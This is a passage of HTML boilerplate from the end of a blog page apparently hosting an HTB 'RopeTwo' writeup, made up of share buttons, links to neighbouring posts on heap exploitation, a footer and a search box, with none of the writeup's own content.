          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/ropetwo-hackthebox/&amp;title=HTB:%20RopeTwo%20Writeup"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="mailto:?body=http://localhost:1313/posts/ropetwo-hackthebox/&amp;subject=HTB:%20RopeTwo%20Writeup"
          title="Send via email"
          aria-label="Send via email"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.threads.net/intent/post?text=http://localhost:1313/posts/ropetwo-hackthebox/%20HTB:%20RopeTwo%20Writeup"
          title="Post on Threads"
          aria-label="Post on Threads"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M331.5 235.7c2.2 .9 4.2 1.9 6.3 2.8c29.2 14.1 50.6 35.2 61.8 61.4c15.7 36.5 17.2 95.8-30.3 143.2c-36.2 36.2-80.3 52.5-142.6 53h-.3c-70.2-.5-124.1-24.1-160.4-70.2c-32.3-41-48.9-98.1-49.5-169.6V256v-.2C17 184.3 33.6 127.2 65.9 86.2C102.2 40.1 156.2 16.5 226.4 16h.3c70.3 .5 124.9 24 162.3 69.9c18.4 22.7 32 50 40.6 81.7l-40.4 10.8c-7.1-25.8-17.8-47.8-32.2-65.4c-29.2-35.8-73-54.2-130.5-54.6c-57 .5-100.1 18.8-128.2 54.4C72.1 146.1 58.5 194.3 58 256c.5 61.7 14.1 109.9 40.3 143.3c28 35.6 71.2 53.9 128.2 54.4c51.4-.4 85.4-12.6 113.7-40.9c32.3-32.2 31.7-71.8 21.4-95.9c-6.1-14.2-17.1-26-31.9-34.9c-3.7 26.9-11.8 48.3-24.7 64.8c-17.1 21.8-41.4 33.6-72.7 35.3c-23.6 1.3-46.3-4.4-63.9-16c-20.8-13.8-33-34.8-34.3-59.3c-2.5-48.3 35.7-83 95.2-86.4c21.1-1.2 40.9-.3 59.2 2.8c-2.4-14.8-7.3-26.6-14.6-35.2c-10-11.7-25.6-17.7-46.2-17.8H227c-16.6 0-39 4.6-53.3 26.3l-34.4-23.6c19.2-29.1 50.3-45.1 87.8-45.1h.8c62.6 .4 99.9 39.5 103.7 107.7l-.2 .2zm-156 68.8c1.3 25.1 28.4 36.8 54.6 35.3c25.6-1.4 54.6-11.4 59.5-73.2c-13.2-2.9-27.8-4.4-43.4-4.4c-4.8 0-9.6 .1-14.4 .4c-42.9 2.4-57.2 23.2-56.2 41.8l-.1 .1z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://telegram.me/share/url?text=http://localhost:1313/posts/ropetwo-hackthebox/&amp;url=HTB:%20RopeTwo%20Writeup"
          title="Share on Telegram"
          aria-label="Share on Telegram"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
</span></a
        >
      
    
  </section>


      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="group flex" href="/posts/dream-diary-chapter-1/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HTB Pwn - Dream Diary Chapter: 1</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2020-10-19 00:00:00 &#43;0000 UTC">19 October 2020</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/posts/overlapping_chunks_tcache/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Overlapping Chunks: GLIBC 2.27 Heap Exploitation</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2021-01-21 00:00:00 &#43;0000 UTC">21 January 2021</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex list-none flex-col sm:flex-row">
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="/tags/"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >Tags</span
                  >
                </a
              >
            
          </li>
        
      </ul>
    </nav>
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            Copy, <em>right?</em> 🤔
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
        <div
          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        >
          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
            <div
              class="flex h-12 w-12 items-center justify-center dark:hidden"
              title="Switch to dark appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
            </div>
            <div
              class="hidden h-12 w-12 items-center justify-center dark:flex"
              title="Switch to light appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
            </div>
          </button>
        </div>
      
    </div>
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
>
  <div
    id="search-modal"
    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex flex-none items-center justify-between px-2">
      <form class="flex min-w-0 flex-auto items-center">
        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto overflow-auto px-2">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
